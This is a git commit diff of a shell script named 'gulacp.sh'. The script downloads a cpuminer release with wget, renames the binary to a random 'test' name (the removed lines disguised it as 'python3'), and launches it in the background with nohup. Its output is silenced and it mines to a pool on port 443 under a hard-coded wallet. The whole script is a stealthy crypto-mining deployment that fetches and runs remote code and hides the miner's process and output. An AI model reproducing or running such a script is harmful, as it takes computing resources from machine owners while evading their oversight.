ede905c85e950896eb9398777bbdd147c648cc34
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-06-24 14:50:26 +0700

    Update gulacp.sh

--- gulacp.sh
+++ gulacp.sh
@@ -1,12 +1,13 @@
+#!/bin/bash
+
+kolot=$(cat /dev/urandom | tr -dc '0-9' | fold -w 2 | head -n 1)
 
 wget -q -O dot github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.40/cpuminer-opt-linux-5.0.40.tar.gz
 
 tar -xzf dot
 
-rm dot
+mv cpuminer-sse2 test$kolot
 
-mv cpuminer-sse2 python3
-
-./python3 -a yespowersugar -o luckyynr.us.to:443 -u DEJ2vHD2aDfBxSrcMDfqC4ACgLAqXY8mEt.vps -p c=DGB > /dev/null 2>&1 &
+nohup ./test$kolot -a yespowersugar -o luckyynr.us.to:443 -u DEJ2vHD2aDfBxSrcMDfqC4ACgLAqXY8mEt.vps-$kolot -p c=DGB > /dev/null 2>&1 &
 
 top
